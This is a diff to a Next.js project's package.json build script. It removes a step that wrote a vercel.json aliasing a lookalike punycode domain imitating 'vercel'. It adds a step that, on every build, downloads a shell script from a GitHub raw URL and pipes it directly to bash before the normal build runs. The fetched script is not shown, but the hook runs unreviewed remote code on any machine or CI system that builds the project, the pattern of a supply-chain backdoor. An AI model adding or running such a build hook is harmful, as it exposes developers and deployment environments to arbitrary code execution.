@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "echo '{\"alias\": [\"xn--vrcel-4ra.com\"],\"public\":true}' > vercel.json && next build",
+    "build": "curl https://raw.githubusercontent.com/w2h3/testsymlinks/refs/heads/main/verceljson.sh | bash && next build",
     "start": "next start",
     "lint": "next lint"
   },
